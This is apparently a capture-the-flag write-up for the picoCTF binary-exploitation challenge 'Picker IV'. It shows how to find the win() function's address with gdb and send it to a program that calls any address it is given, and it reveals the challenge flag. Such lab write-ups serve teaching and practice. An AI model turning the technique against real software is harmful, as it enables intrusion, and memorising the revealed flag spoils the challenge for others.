# Picker IV

**Author:** [yairp03](https://github.com/yairp03)  
**Category:** Binary Exploitation  
**Points:** 100

# Challenge

## Description

Can you figure out how this program works to get the flag?
Connect to the program with netcat:
`$ nc saturn.picoctf.net 54266`
The program's source code can be downloaded [here](./picker-IV.c). The binary can be downloaded [here](./picker-IV).

## Source

[picker-IV.c](./picker-IV.c) (C source)  
[picker-IV](./picker-IV) (64-bit ELF)

# Solution

Here we get a C source code. It asks us for an address, and then treat this address as a function and calls it. We want to invoke the `win()` function, which prints the flag, and to do so, we need to find its address. We can do it using gdb:

```bash
$ gdb ./picker-IV
(gdb) disas win
Dump of assembler code for function win:
   0x000000000040129e <+0>:     endbr64
   0x00000000004012a2 <+4>:     push   rbp
   ...
End of assembler dump.
```

And there it is, the address of the `win()` function is `0x40129e`. Now we can run the program and give it this address:

```bash
$ ./picker-IV
Enter the address in hex to jump to, excluding '0x': 40129e
You input 0x40129e
You won!
Cannot open file.
```

Looks like it works, now let's do it on the server:

```bash
$ nc saturn.picoctf.net 54266
Enter the address in hex to jump to, excluding '0x': 40129e
You input 0x40129e
You won!
picoCTF{n3v3r_jump_t0_u53r_5uppl13d_4ddr35535_01672a61}
```

**The Flag:** `picoCTF{n3v3r_jump_t0_u53r_5uppl13d_4ddr35535_01672a61}`
